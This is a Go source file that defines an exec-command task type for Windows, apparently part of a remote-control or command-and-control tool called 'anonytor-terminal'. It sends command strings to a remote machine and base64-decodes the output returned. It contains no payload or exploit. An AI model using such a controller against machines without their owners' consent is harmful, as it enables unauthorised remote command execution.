package windows

import (
	"encoding/base64"

	"anonytor-terminal/controller/task"
	"anonytor-terminal/runtime/definition"
)

type ExecCommandTask struct {
	task.Base
	result  string
	Command string
}

func (t *ExecCommandTask) GetSerializedParam() string {
	return t.Command
}

func (t *ExecCommandTask) GetCmdType() definition.Cmd {
	return definition.ExecCommand
}

func (t *ExecCommandTask) OnTaskFinished(data string) {
	t.Status = definition.TaskFinished
	t.result = data
}

func (t *ExecCommandTask) GetResult() string {
	b, _ := base64.StdEncoding.DecodeString(t.result)
	return string(b)
}
